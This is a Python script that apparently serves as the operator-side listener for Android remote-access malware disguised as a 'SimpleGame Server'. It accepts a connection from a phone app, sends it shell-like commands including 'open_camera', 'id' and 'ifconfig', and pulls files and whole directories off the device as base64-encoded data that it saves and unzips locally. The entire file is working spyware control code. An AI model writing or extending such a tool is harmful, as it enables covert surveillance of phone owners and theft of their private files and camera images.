import socket
import base64
import os
import zipfile
import sys

HOST = '0.0.0.0'
PORT = 8433

def start_server():
    print("=" * 60)
    print(f"[*] Starting SimpleGame Server on {HOST}:{PORT}...")
    print("=" * 60)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print("[*] Waiting for Android app connection...")
    client_socket, client_address = server_socket.accept()
    print(f"[+] Connected from {client_address[0]}:{client_address[1]}\n")

    rfile = client_socket.makefile('r', encoding='utf-8')
    wfile = client_socket.makefile('w', encoding='utf-8')

    init_msg = rfile.readline().strip()
    print(f"[*] App Connected: {init_msg}")

    # Read initial END_OF_RESPONSE if present
    rfile.readline()

    print("[*] Current Working Directory on Server:", os.getcwd())
    print("[*] Available commands: help, ls, pwd, cd <dir>, scp <file_or_dir>, open_camera, info, ifconfig, id, ping, exit\n")

    try:
        while True:
            cmd = input("SimpleGame> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Closing server...")
                break

            # Send command to Android app
            wfile.write(cmd + "\n")
            wfile.flush()

            # Read response from Android app
            while True:
                line = rfile.readline()
                if not line:
                    break
                line_str = line.rstrip("\r\n")

                if line_str == "[END_OF_RESPONSE]":
                    break

                if line_str.startswith("SCP_BEGIN:FILE:"):
                    parts = line_str.split(":")
                    filename = parts[2]
                    file_size = parts[3] if len(parts) > 3 else "unknown"

                    print(f"[*] Downloading file '{filename}' ({file_size} bytes)...")
                    base64_data = rfile.readline().strip()
                    rfile.readline() # SCP_END

                    file_bytes = base64.b64decode(base64_data)

                    # Save file with real extension in server's current directory
                    output_path = os.path.join(os.getcwd(), filename)
                    with open(output_path, "wb") as f:
                        f.write(file_bytes)

                    print(f"[+] SUCCESS: Saved file '{filename}' in current directory ({output_path})\n")

                elif line_str.startswith("SCP_BEGIN:DIR:"):
                    parts = line_str.split(":")
                    zip_filename = parts[2]
                    zip_size = parts[3] if len(parts) > 3 else "unknown"

                    print(f"[*] Downloading directory archive '{zip_filename}' ({zip_size} bytes)...")
                    base64_data = rfile.readline().strip()
                    rfile.readline() # SCP_END

                    zip_bytes = base64.b64decode(base64_data)

                    # Save zip file temporarily to current directory
                    zip_path = os.path.join(os.getcwd(), zip_filename)
                    with open(zip_path, "wb") as f:
                        f.write(zip_bytes)

                    # Extract zip into current directory
                    folder_name = zip_filename.replace(".zip", "")
                    print(f"[*] Extracting '{zip_filename}' into current directory...")
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        zip_ref.extractall(os.getcwd())

                    # Remove temporary zip file
                    if os.path.exists(zip_path):
                        os.remove(zip_path)

                    print(f"[+] SUCCESS: Extracted directory '{folder_name}' in current directory ({os.getcwd()})\n")

                else:
                    print(line_str)

    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
    except Exception as e:
        print(f"\n[-] Socket Error: {e}")
    finally:
        client_socket.close()
        server_socket.close()

if __name__ == "__main__":
    start_server()

